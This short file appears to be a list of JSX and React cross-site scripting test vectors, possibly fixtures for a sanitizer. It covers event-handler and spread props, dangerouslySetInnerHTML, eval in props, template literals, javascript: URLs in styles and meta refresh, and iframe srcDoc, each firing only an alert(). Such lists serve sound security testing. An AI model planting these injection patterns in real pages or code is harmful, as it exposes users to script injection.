<Component onClick={() => alert('JSX component injection')} />

<div {...{onClick: () => alert('spread props')}}>Spread attributes</div>

<script type="text/babel">
  const MyComponent = () => {
    alert('JSX in script tag');
    return React.createElement('div', null, 'XSS');
  };
</script>

{alert('Direct JavaScript expression')}

{/* Comment with <script>alert('XSS')</script> */}

<div dangerouslySetInnerHTML={{__html: '<script>alert("XSS")</script>'}} />

<div ref={(el) => alert('ref callback')} />

<Component 
  {...{
    onClick: function() { alert('function prop') },
    onLoad: () => eval('alert("eval in prop")'),
    children: <script>alert('JSX children')</script>
  }}
/>

<div className={`class-${alert('template literal')}`} />

<MyCustomComponent>
  <script>alert('Custom component children')</script>
</MyCustomComponent>

<div style={{backgroundImage: 'url("javascript:alert(\'CSS injection\')")'}} />

<iframe srcDoc="<script>alert('XSS via srcDoc')</script>" />

<meta httpEquiv="refresh" content="0;url=javascript:alert('XSS')" />